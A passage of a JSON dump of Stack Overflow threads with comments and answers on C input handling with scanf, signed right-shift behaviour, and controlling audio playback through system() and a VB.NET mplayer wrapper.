RTCAlarm_IRQHandler\nISR_HANDLER USBWakeUp_IRQHandler\n</code></pre>\n"}, {"tags": ["c", "types", "scanf"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1459348646, "post_id": 36311936, "comment_id": 60247480, "body": "1) <code>scanf(&quot;%[^\\n]&quot;,string);</code> --&gt; <code>scanf(&quot; %[^\\n]&quot;,string);</code>  (add space)  2) Don&#39;t use <code>scanf()</code>  use <code>fgets()</code> and then <code>sscanf()</code>."}], "answers": [{"comments": [{"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "reply_to_user": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1459350800, "post_id": 36312059, "comment_id": 60249088, "body": "@CoolGuy Thanks, added."}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1459351849, "post_id": 36312059, "comment_id": 60249969, "body": "&quot;<i>stops reading while leaving some input in the stdin buffer</i>&quot; - Some input? It fails and leaves the <code>\\n</code> in the <code>stdin</code>."}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "reply_to_user": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1459353260, "post_id": 36312059, "comment_id": 60251077, "body": "@CoolGuy Yeah, some input, whatever was typed in. This includes the newline."}], "tags": [], "owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "is_accepted": false, "score": 1, "last_activity_date": 1459350791, "last_edit_date": 1459350791, "creation_date": 1459348523, "answer_id": 36312059, "question_id": 36311936, "link": "https://stackoverflow.com/questions/36311936/the-compiler-skips-the-scanf-statement-for-charter-input-after-double-why-does/36312059#36312059", "title": "The compiler skips the scanf statement for charter input after double. Why does this happen?", "body": "<pre><code>scanf(\"%f\",&amp;decimalvar); \n</code></pre>\n\n<p>should be:</p>\n\n<pre><code>scanf(\"%lf\",&amp;decimalvar); \n</code></pre>\n\n<p>because you're passing a <code>double</code> not a <code>float</code>.</p>\n\n<p>This is technically undefined behavior, but is not the cause of your problem, which is that a newline is left in the stdin buffer after the scanf calls. Specifiers like <code>d</code>, <code>f</code>, <code>lf</code> consume and ignore that newline. Of course the specifier [^\\n] finds that newline and stops reading while leaving some input in the stdin buffer.</p>\n\n<p>To solve the problem add a space at the start of the scanf format string, which will consume the newline, before trying to read the stdin.</p>\n\n<pre><code>scanf(\" %[^\\n]\",string);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 11698, "user_id": 5399734, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/2162d669508364bb0c03aba1a2473aa8?s=128&d=identicon&r=PG&f=1", "display_name": "nalzok", "link": "https://stackoverflow.com/users/5399734/nalzok"}, "is_accepted": false, "score": 1, "last_activity_date": 1459352167, "last_edit_date": 1495540787, "creation_date": 1459350674, "answer_id": 36312896, "question_id": 36311936, "link": "https://stackoverflow.com/questions/36311936/the-compiler-skips-the-scanf-statement-for-charter-input-after-double-why-does/36312896#36312896", "title": "The compiler skips the scanf statement for charter input after double. Why does this happen?", "body": "<p>After every <code>scanf()</code> statement is executed, a '\\n' is left in <code>stdin</code>. When executing <code>scanf(\"%[^\\n]\", string);</code>, that '\\n' immediately causes a matching failure (<code>\"%[^\\n]\"</code> expects all characters other than '\\n'), so <code>scanf()</code> sadly returns.</p>\n\n<p>To fix this, simply add a leading space in the format string to discard all (0 or more) whitespace characters, like this:</p>\n\n<pre><code>scanf(\" %[^\\n]\", string);\n</code></pre>\n\n<p>A few unrelated tips:</p>\n\n<ol>\n<li>Change <code>scanf(\"%f\", &amp;decimalvar);</code> to <code>scanf(\"%lf\", &amp;decimalvar);</code> to avoid undefined behaviour. See <a href=\"https://stackoverflow.com/q/210590/5399734\">Why does scanf() need &quot;%lf&quot; for doubles, when printf() is okay with just &quot;%f&quot;?</a></li>\n<li>Use <code>fgets(string, sizeof string, stdin)</code> to prevent the potential buffer overflow.</li>\n</ol>\n"}, {"tags": [], "owner": {"reputation": 77, "user_id": 5521543, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204658594895407/picture?type=large", "display_name": "Hajras El Gdiry HG", "link": "https://stackoverflow.com/users/5521543/hajras-el-gdiry-hg"}, "is_accepted": false, "score": 0, "last_activity_date": 1459364962, "creation_date": 1459364962, "answer_id": 36317620, "question_id": 36311936, "link": "https://stackoverflow.com/questions/36311936/the-compiler-skips-the-scanf-statement-for-charter-input-after-double-why-does/36317620#36317620", "title": "The compiler skips the scanf statement for charter input after double. Why does this happen?", "body": "<pre><code>scanf(\"%[^\\n]\",string);  \n</code></pre>\n\n<p>should be </p>\n\n<pre><code>scanf(\"%s\",string);\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 6135222, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/903fab57f0d85baab8be4a5039a7df03?s=128&d=identicon&r=PG&f=1", "display_name": "santhosh", "link": "https://stackoverflow.com/users/6135222/santhosh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 190, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1459364962, "creation_date": 1459348255, "last_edit_date": 1459350471, "question_id": 36311936, "link": "https://stackoverflow.com/questions/36311936/the-compiler-skips-the-scanf-statement-for-charter-input-after-double-why-does", "title": "The compiler skips the scanf statement for charter input after double. Why does this happen?", "body": "<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;string.h&gt;\n\nint main()\n{\n    int intvar=0; //variable to store integer input\n    double decimalvar = 0; //variable to store double input\n    char string[30]; //arrary to store string\n\n    scanf(\"%d\",&amp;intvar); //scan for int input\n    scanf(\"%f\",&amp;decimalvar); //scan for double input\n    scanf(\"%[^\\n]\",string); //scan for a line input\n\n    printf(\"%d\\n\",intvar); //print int var\n    printf(\"%.1f\\n\",decimalvar);//print double var\n    printf(\"%s\",string);//print string\n\n    return 0;\n}\n</code></pre>\n\n<p>The program runs successfully, but it only takes two input. After entering the second input, the third scanf statement is skipped and the printf statements are executed. Why does this happen?</p>\n"}, {"tags": ["c", "c99", "bit-shift"], "comments": [{"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 3, "creation_date": 1459348409, "post_id": 36311912, "comment_id": 60247275, "body": "A few whose -1 is not 1111...., and a lot whose int is not 32 bits."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1459349008, "post_id": 36311912, "comment_id": 60247764, "body": "Note: Don&#39;t use an outdated version of the standard. C standard is C11, not C99. Said that, the text is very clear. Don&#39;t rely on it if you want your code portable. Note the shift can also invoke undefined behaviour. See 6.5.7p3 in the standard (i.e. the only valid version)."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1459349340, "post_id": 36311912, "comment_id": 60247988, "body": "Also many 32-bit, twos-complement implementations that ignore the signedness and produce <code>1</code> as the result.  The standard is in fact carefully worded to avoid specifying whether <code>&gt;&gt;</code> performs an arithmetic shift or a logical shift."}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1555232391, "post_id": 36311912, "comment_id": 98032649, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/6487918/signed-right-shift-which-compiler-use-logical-shift\">Signed right shift: which compiler use logical shift</a>"}], "answers": [{"comments": [{"owner": {"reputation": 3868, "user_id": 318811, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/3d03167ed57857f7e7564bac118a4d03?s=128&d=identicon&r=PG", "display_name": "MarkP", "link": "https://stackoverflow.com/users/318811/markp"}, "edited": false, "score": 0, "creation_date": 1459350155, "post_id": 36312359, "comment_id": 60248598, "body": "@Lundin I&#39;m working with some crypto code which takes advantage of arithmetic right shifting as a way to remove an if statement. Thanks for your answer."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 3868, "user_id": 318811, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/3d03167ed57857f7e7564bac118a4d03?s=128&d=identicon&r=PG", "display_name": "MarkP", "link": "https://stackoverflow.com/users/318811/markp"}, "edited": false, "score": 0, "creation_date": 1459350250, "post_id": 36312359, "comment_id": 60248680, "body": "@MarkP Oh but then you definitely need to reconsider that algorithm, if portability is important."}, {"owner": {"reputation": 3868, "user_id": 318811, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/3d03167ed57857f7e7564bac118a4d03?s=128&d=identicon&r=PG", "display_name": "MarkP", "link": "https://stackoverflow.com/users/318811/markp"}, "edited": false, "score": 0, "creation_date": 1459350403, "post_id": 36312359, "comment_id": 60248811, "body": "@Lundin Yes, that&#39;s the heart of the issue. It&#39;s unlikely that this code will run on microcontrollers. The main concern was that there are big computers out there that cannot handle this situation."}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 0, "creation_date": 1459351756, "post_id": 36312359, "comment_id": 60249890, "body": "@Lundin Even if signed integers are 2&#39;s complement, and right shift is an arithmetic right shift, dividing by two is not the same as right shift when the value being operated on is both negative and odd. Division truncates towards zero, but arithmetic right shift truncates towards minus infinity."}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": true, "score": 2, "last_activity_date": 1459349303, "creation_date": 1459349303, "answer_id": 36312359, "question_id": 36311912, "link": "https://stackoverflow.com/questions/36311912/arithmetic-right-shift-of-signed-integer/36312359#36312359", "title": "Arithmetic right-shift of signed integer", "body": "<p>Most embedded compilers for microcontrollers tend to favour logical shift (shift in zeroes) instead of arithmetic shift (shift in the sign bit). </p>\n\n<p>This is probably because signed numbers are somewhat rare in embedded systems, since such programming is much closer to the hardware and further away from users, than for example desktop programming with screens. </p>\n\n<p>Signed numbers is nothing but user presentation after all. If you have no need to print numbers to a user, then you don't need signed numbers very often at all.</p>\n\n<p>And of course, it doesn't really make any sense to use shift on signed numbers to begin with. I have never in my programming career encountered a scenario when I had needed to do that. Meaning in most cases, such shifts are just accidental bugs.</p>\n"}, {"comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1459364633, "post_id": 36314198, "comment_id": 60258418, "body": "What has this to do with the question?"}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1459424296, "post_id": 36314198, "comment_id": 60286583, "body": "@Lundin It&#39;s related to the question, though doesn&#39;t answer the question directly. It&#39;s hard to put code in a normal comment. It kind of answers it as an X Y problem. If you can&#39;t rely on <code>&gt;&gt;</code> to do an arithmetic right shift, how can it be done portably?"}], "tags": [], "owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "is_accepted": false, "score": 0, "last_activity_date": 1459354141, "creation_date": 1459354141, "answer_id": 36314198, "question_id": 36311912, "link": "https://stackoverflow.com/questions/36311912/arithmetic-right-shift-of-signed-integer/36314198#36314198", "title": "Arithmetic right-shift of signed integer", "body": "<p>You can simulate a signed, 2's complement arithmetic right shift using unsigned types without the use of <code>if</code> statements. For example:</p>\n\n<pre><code>#include &lt;limits.h&gt;\n\nunsigned int asr(unsigned int x, unsigned int shift)\n{\n    return (x &gt;&gt; shift) | -((x &amp; ~(UINT_MAX &gt;&gt; 1)) &gt;&gt; shift);\n}\n</code></pre>\n\n<p>You might need to use a different unsigned type and its associated max value in your code.</p>\n"}], "owner": {"reputation": 3868, "user_id": 318811, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/3d03167ed57857f7e7564bac118a4d03?s=128&d=identicon&r=PG", "display_name": "MarkP", "link": "https://stackoverflow.com/users/318811/markp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 599, "favorite_count": 0, "accepted_answer_id": 36312359, "answer_count": 2, "score": 0, "last_activity_date": 1459354141, "creation_date": 1459348210, "question_id": 36311912, "link": "https://stackoverflow.com/questions/36311912/arithmetic-right-shift-of-signed-integer", "title": "Arithmetic right-shift of signed integer", "body": "<p>The C99 spec states: </p>\n\n<blockquote>\n  <p>The result of E1 >> E2 is E1 right-shifted E2 bit positions. If E1 has an unsigned type or if E1 has a signed type and a nonnegative value, the value of the result is the integral part of the quotient of E1 / 2^E2. If E1 has a signed type and a negative value, the resulting value is implementation-defined.</p>\n</blockquote>\n\n<p>I'm curious to know, which implementations/compilers will not treat a signed <code>E1 &gt;&gt; 31</code> as a bunch of <code>11111....</code>?</p>\n"}, {"tags": ["c", "audio"], "comments": [{"owner": {"reputation": 694, "user_id": 3359785, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b70b6aa40999aa6510928a30a005e1e9?s=128&d=identicon&r=PG", "display_name": "RhinoDevel", "link": "https://stackoverflow.com/users/3359785/rhinodevel"}, "edited": false, "score": 2, "creation_date": 1459347572, "post_id": 36311472, "comment_id": 60246505, "body": "<a href=\"http://www.cplusplus.com/reference/cstdlib/system/\" rel=\"nofollow noreferrer\">system()</a> executes a command. Do you really have a command <code>q</code> on your computer??"}, {"owner": {"reputation": 31218, "user_id": 211160, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/Z2fk7.png?s=128&g=1", "display_name": "HostileFork says dont trust SE", "link": "https://stackoverflow.com/users/211160/hostilefork-says-dont-trust-se"}, "edited": false, "score": 1, "creation_date": 1459347940, "post_id": 36311472, "comment_id": 60246845, "body": "<code>system()</code> is not performing keystrokes to automate programs, as if you were typing.  If you want to do something like that, you would likely be much better off using something like <a href=\"http://www.sikuli.org/\" rel=\"nofollow noreferrer\">Sikuli</a> or <a href=\"https://en.wikipedia.org/wiki/AutoHotkey\" rel=\"nofollow noreferrer\">AutoHotKey</a> or similar."}, {"owner": {"reputation": 8257, "user_id": 1030018, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/65f9ef2a64f6231f7a074afd04f17e27?s=128&d=identicon&r=PG&f=1", "display_name": "Jeyaram", "link": "https://stackoverflow.com/users/1030018/jeyaram"}, "edited": false, "score": 0, "creation_date": 1459347979, "post_id": 36311472, "comment_id": 60246890, "body": "I believe you are trying to quit VLC application using <code>system(&quot;q&quot;) </code>. But it executes a command <code>q</code> which is not available. I suggest to look the following link to simulate key strokes in Linux <a href=\"http://stackoverflow.com/questions/1262310/simulate-keypress-in-a-linux-c-console-application\" title=\"simulate keypress in a linux c console application\">stackoverflow.com/questions/1262310/&hellip;</a>"}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 1, "creation_date": 1459348878, "post_id": 36311472, "comment_id": 60247659, "body": "Try <code>system(&quot;vlc --play-and-exit 1.mp3&quot;);</code>."}], "answers": [{"comments": [{"owner": {"reputation": 37, "user_id": 5425868, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-6Yx7BwQwIq4/AAAAAAAAAAI/AAAAAAAAADw/aL29umN5PRU/photo.jpg?sz=128", "display_name": "Akanshu Gupta", "link": "https://stackoverflow.com/users/5425868/akanshu-gupta"}, "edited": false, "score": 0, "creation_date": 1459648883, "post_id": 36312096, "comment_id": 60378977, "body": "Thank u! my work is done now. but i would still love to see vb.net code if u can provide for some future work."}], "tags": [], "owner": {"reputation": 103, "user_id": 2058144, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8wjax.jpg?s=128&g=1", "display_name": "Blue Phoenix", "link": "https://stackoverflow.com/users/2058144/blue-phoenix"}, "is_accepted": false, "score": 0, "last_activity_date": 1459394207, "last_edit_date": 1459394207, "creation_date": 1459348600, "answer_id": 36312096, "question_id": 36311472, "link": "https://stackoverflow.com/questions/36311472/playing-multiple-audio-files-using-system-in-c/36312096#36312096", "title": "Playing multiple audio files using system() in C", "body": "<p>I think you should use mplayer in slave mode instead of vlc. It is more flexible and has more control. you can send command to mplayer as you wish. please study the following link</p>\n\n<p><a href=\"http://www.mplayerhq.hu/DOCS/tech/slave.txt\" rel=\"nofollow\">http://www.mplayerhq.hu/DOCS/tech/slave.txt</a></p>\n\n<p>I suggest you to use python for linux and C# or VB.NET for windows. I can supply some vb.net code if you need it.</p>\n"}, {"tags": [], "owner": {"reputation": 103, "user_id": 2058144, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8wjax.jpg?s=128&g=1", "display_name": "Blue Phoenix", "link": "https://stackoverflow.com/users/2058144/blue-phoenix"}, "is_accepted": false, "score": 0, "last_activity_date": 1459825897, "creation_date": 1459825897, "answer_id": 36416467, "question_id": 36311472, "link": "https://stackoverflow.com/questions/36311472/playing-multiple-audio-files-using-system-in-c/36416467#36416467", "title": "Playing multiple audio files using system() in C", "body": "<p>This was my old answer for another question.</p>\n\n<p>but I will post here for you too.</p>\n\n<p>I am developing android phone remote control + VB.NET TCP server - mplayer. I am using mplayer in slave mode. I send command from android app to VB.NET TCP server. Then the command will send to mplayer.</p>\n\n<p>I will show some code that control and send the mplayer desired commands, but the server part is not finished yet. The coding is no finished yet but I hope it is useful for you.</p>\n\n<pre><code>Imports System.ComponentModel\nImports System.IO\nImports System.Data.OleDb\n    Public Class Form1\n      Private bw As BackgroundWorker = New BackgroundWorker\n      Dim i As Integer = 0\n      Dim dbFile As String = Application.StartupPath &amp; \"\\Data\\Songs.accdb\"\n      Public connstring As String = \"Provider=Microsoft.ACE.OLEDB.12.0; Data Source=\" &amp; dbFile &amp; \"; persist security info=false\"\n      Public conn As New OleDbConnection(connstring)\n      Dim sw As Stopwatch\n      Dim ps As Process = Nothing\n      Dim jpgPs As Process = Nothing\n      Dim args As String = Nothing\n      Private Sub bw_DoWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)\n         Dim worker As BackgroundWorker = CType(sender, BackgroundWorker)\n\n         If bw.CancellationPending = True Then\n             e.Cancel = True\n             Exit Sub\n         Else\n        ' Perform a time consuming operation and report progress.\n        'System.Threading.Thread.Sleep(500)\n        bw.ReportProgress(i * 10)\n        Dim dir_info As New DirectoryInfo(TextBox1.Text)\n        ListFiels(\"SongList\", TextBox2.Text, dir_info)\n    End If\n\n End Sub\n\n   Private Sub bw_RunWorkerCompleted(ByVal sender As Object, ByVal e As RunWorkerCompletedEventArgs)\n    If e.Cancelled = True Then\n        Me.tbProgress.Text = \"Canceled!\"\n    ElseIf e.Error IsNot Nothing Then\n        Me.tbProgress.Text = \"Error: \" &amp; e.Error.Message\n    Else\n        Me.tbProgress.Text = \"Done!\"\n    End If\nEnd Sub\n\n  Private Sub bw_ProgressChanged(ByVal sender As Object, ByVal e As ProgressChangedEventArgs)\n       Me.tbProgress.Text = e.ProgressPercentage.ToString() &amp; \"%\"\n  End Sub\n\n  Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing\n        Try\n           ps.Kill()\n        Catch\n            Debug.Write(\"already closed\")\n        End Try\n    End Sub\n\n\nPrivate Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load\n    Windows.Forms.Control.CheckForIllegalCrossThreadCalls = False 'To avoid error from backgroundworker\n    bw.WorkerReportsProgress = True\n    bw.WorkerSupportsCancellation = True\n    AddHandler bw.DoWork, AddressOf bw_DoWork\n    AddHandler bw.ProgressChanged, AddressOf bw_ProgressChanged\n    AddHandler bw.RunWorkerCompleted, AddressOf bw_RunWorkerCompleted\n    funPlayMusic()\nEnd Sub\n\nPrivate Sub buttonStart_Click(sender As Object, e As EventArgs) Handles buttonStart.Click\n    If Not bw.IsBusy = True Then\n        bw.RunWorkerAsync()\n    End If\nEnd Sub\n\nPrivate Sub buttonCancel_Click(sender As Object, e As EventArgs) Handles buttonCancel.Click\n    If bw.WorkerSupportsCancellation = True Then\n        bw.CancelAsync()\n    End If\nEnd Sub\n\nPrivate Sub btnSearch_Click(sender As Object, e As EventArgs) Handles btnSearch.Click\n    If Not bw.IsBusy = True Then\n        sw = Stopwatch.StartNew()\n        bw.RunWorkerAsync()\n        sw.Stop()\n        Label1.Text = \":   \" + sw.Elapsed.TotalMilliseconds.ToString() + \" ms\"\n    End If\nEnd Sub\nPrivate Sub ListFiels(ByVal tblName As String, ByVal pattern As String, ByVal dir_info As DirectoryInfo)\n    i = 0\n    Dim fs_infos() As FileInfo = Nothing\n    Try\n        fs_infos = dir_info.GetFiles(pattern)\n    Catch ex As Exception\n        MessageBox.Show(ex.ToString())\n    End Try\n\n\n    For Each fs_info As FileInfo In fs_infos\n        i += 1\n        Label1.Text = i\n        insertData(tblName, fs_info.FullName)\n        lstResults.Items.Add(i.ToString() + \":\" + fs_info.FullName.ToString())\n        If i = 1 Then\n            Playsong(fs_info.FullName.ToString())\n        Else\n            i = 0\n            lstResults.Items.Clear()\n        End If\n    Next fs_info\n    sw.Stop()\n    Label1.Text = \":   \" + sw.Elapsed.TotalMilliseconds.ToString() + \" ms\"\n    fs_infos = Nothing\n\n    Dim subdirs() As DirectoryInfo = dir_info.GetDirectories()\n    For Each subdir As DirectoryInfo In subdirs\n        ListFiels(tblName, pattern, subdir)\n    Next\n\nEnd Sub\nPrivate Sub insertData(ByVal tableName As String, ByVal foundfile As String)\n    Try\n        If conn.State = ConnectionState.Open Then conn.Close()\n        conn.Open()\n\n        Dim SqlQuery As String = \"INSERT INTO \" &amp; tableName &amp; \" (SngPath) VALUES (@sng)\"\n        Dim SqlCommand As New OleDbCommand\n        With SqlCommand\n            .CommandType = CommandType.Text\n            .CommandText = SqlQuery\n            .Connection = conn\n            .Parameters.AddWithValue(\"@sng\", foundfile)\n            .ExecuteNonQuery()\n        End With\n\n        conn.Close()\n    Catch ex As Exception\n        conn.Close()\n        MsgBox(ex.Message)\n    End Try\nEnd Sub\n\n\nPrivate Sub btnClearList_Click(sender As Object, e As EventArgs) Handles btnClearList.Click\n    lstResults.Items.Clear()\nEnd Sub\n\nPrivate Sub funPlayMusic()\n\n    ps = New Process()\n    ps.StartInfo.FileName = \"D:\\Music\\mplayer.exe \"\n    ps.StartInfo.UseShellExecute = False\n    ps.StartInfo.RedirectStandardInput = True\n    jpgPs = New Process()\n    jpgPs.StartInfo.FileName = \"D:\\Music\\playjpg.bat\"\n    jpgPs.StartInfo.UseShellExecute = False\n    jpgPs.StartInfo.RedirectStandardInput = True\n    'ps.StartInfo.CreateNoWindow = True\n    args = \"-fs  -noquiet -identify -slave \" '\n    args += \"-nomouseinput -sub-fuzziness 1 \"\n    args += \" -vo direct3d, -ao dsound \"\n    '    -wid will tell MPlayer to show output inisde our panel\n    '    args += \" -vo direct3d, -ao dsound  -wid \";\n    '    int id = (int)panel1.Handle;\n    '    args += id;\nEnd Sub\nPublic Function SendCommand(ByVal cmd As String) As Boolean\n    Try\n        If ps IsNot Nothing AndAlso ps.HasExited = False Then\n            ps.StandardInput.Write(cmd + vbLf)\n            'MessageBox.Show(ps.StandardOutput.ReadToEndAsync.ToString())\n            Return True\n        Else\n            Return False\n        End If\n\n    Catch ex As Exception\n        Return False\n    End Try\nEnd Function\n\nPublic Sub Playsong(ByVal Songfilelocation As String)\n\n    Try\n        ps.Kill()\n    Catch\n    End Try\n    Try\n        ps.StartInfo.Arguments = args + \" \"\"\" + Songfilelocation + \"\"\"\"\n        ps.Start()\n\n        SendCommand(\"set_property volume \" + \"80\")\n    Catch e As Exception\n        MessageBox.Show(e.Message)\n    End Try\n\nEnd Sub\n\nPrivate Sub lstResults_SelectedIndexChanged(sender As Object, e As EventArgs) Handles lstResults.SelectedIndexChanged\n    Playsong(lstResults.SelectedItem.ToString())\nEnd Sub\n\n\n\nPrivate Sub btnPlayJPG_Click(sender As Object, e As EventArgs) Handles btnPlayJPG.Click\n    Try\n        ' jpgPs.Kill()\n    Catch\n    End Try\n    Try\n        'ps.StartInfo.Arguments = \"\u2013fs \u2013mf fps=5 mf://d:/music/g1/Image00020.jpg \u2013loop 200\" '-vo gl_nosw\n        'jpgPs.Start()\n        Shell(\"d:\\Music\\playjpg.bat\")\n\n        ' SendCommand(\"set_property volume \" + \"80\")\n    Catch ex As Exception\n        MessageBox.Show(ex.Message)\n    End Try\nEnd Sub\n\n\nPrivate Sub btnPlayPause_Click(sender As Object, e As EventArgs) Handles btnPlayPause.Click\n    SendCommand(\"pause\")\n\nEnd Sub\n\nPrivate Sub btnMute_Click(sender As Object, e As EventArgs) Handles btnMute.Click\n    SendCommand(\"mute\")\nEnd Sub\n\nPrivate Sub btnKaraoke_Click(sender As Object, e As EventArgs) Handles btnKaraoke.Click\n    'SendCommand(\"panscan 0-0 | 1-1\")\n    SendCommand(\"af_add pan=2:1:1:0:0\")\n\n\nEnd Sub\n\nPrivate Sub btnStereo_Click(sender As Object, e As EventArgs) Handles btnStereo.Click\n    SendCommand(\"af_add pan=2:0:0:1:1\")\nEnd Sub\n\nPrivate Sub btnStop_Click(sender As Object, e As EventArgs) Handles btnStop.Click\n    Playsong(\"d:\\music\\iot.mp4\")\nEnd Sub\n\nPrivate Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click\n    'SendCommand(\"loadfile d:\\music\\iot.mp4\")\n    'SendCommand(\"pt_step 1\")\n\nEnd Sub\n\nEnd Class\n</code></pre>\n"}], "owner": {"reputation": 37, "user_id": 5425868, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-6Yx7BwQwIq4/AAAAAAAAAAI/AAAAAAAAADw/aL29umN5PRU/photo.jpg?sz=128", "display_name": "Akanshu Gupta", "link": "https://stackoverflow.com/users/5425868/akanshu-gupta"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 81, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1459825897, "creation_date": 1459347180, "question_id": 36311472, "link": "https://stackoverflow.com/questions/36311472/playing-multiple-audio-files-using-system-in-c", "title": "Playing multiple audio files using system() in C", "body": "<p>I've written a C code to play 3 audio files one after other using vlc but the after playing first file it's not proceeding I've to press Ctrl+C or q to go to next song which I want to happen itself.\nI placed system(\"q\") after every file so that it may fulfill my task but it's 